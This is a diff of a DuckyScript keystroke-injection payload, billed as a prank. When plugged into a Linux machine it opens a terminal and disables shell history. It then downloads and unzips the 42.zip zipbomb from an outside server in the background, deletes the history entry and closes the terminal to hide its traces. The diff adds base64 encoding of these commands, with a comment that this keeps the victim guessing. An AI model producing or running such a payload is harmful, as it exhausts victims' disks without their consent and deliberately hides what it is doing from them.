@@ -4,7 +4,7 @@ REM Target:  Unix-like tested on kubuntu 22.04
 REM Props: Hak5, strippers and memes
 REM Version: 1.0
 REM Category: Prank
-REM zipbomb I found and thought I would have some fun with. Covers tracks, opens a background download/unzip, and closes the terminal for no trace.
+REM zipbomb I found and thought I would have some fun with. Covers tracks, opens a background download/unzip, and closes the terminal for no trace. Base64 encoded so victim has to guess what's happening an why not lol.
 DELAY 300
 REM Minimize all windows as that ensures launch happens smoother and when the terminal is launched everything else is relaunched for no trace of funny business.
 WINDOWS d
@@ -12,11 +12,11 @@ DELAY 300
 CTRL-ALT t
 DELAY 1500
 REM sneak +1 don't delete the whole history or mess with size settings, just turn history off and delete the history change entry ;)
-STRING set +o history
+STRING base64 -d <<< c2V0ICtvIGhpc3RvcnkK | sh
 DELAY 300
 ENTER
 REM FIRE IN THE HOLE!
-STRING nohup wget https://www.lostserver.com/static/42.zip >/dev/null && unzip 42.zip >/dev/null && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history &
+STRING base64 -d <<< bm9odXAgd2dldCBodHRwczovL3d3dy5sb3N0c2VydmVyLmNvbS9zdGF0aWMvNDIuemlwID4vZGV2L251bGwgJiYgdW56aXAgNDIuemlwID4vZGV2L251bGwgJiYgaGlzdG9yeSB8IGdyZXAgaGlzdG9yeSAmJiBsaW5lPSQoaGlzdG9yeSB8IGdyZXAgaGlzdG9yeSB8IGF3ayAneyBwcmludCAkMSB9JykgJiYgaGlzdG9yeSAtZCAkbGluZSAmJiBzZXQgLW8gaGlzdG9yeSAmCg== | sh
 DELAY 500
 ENTER
 DELAY 500
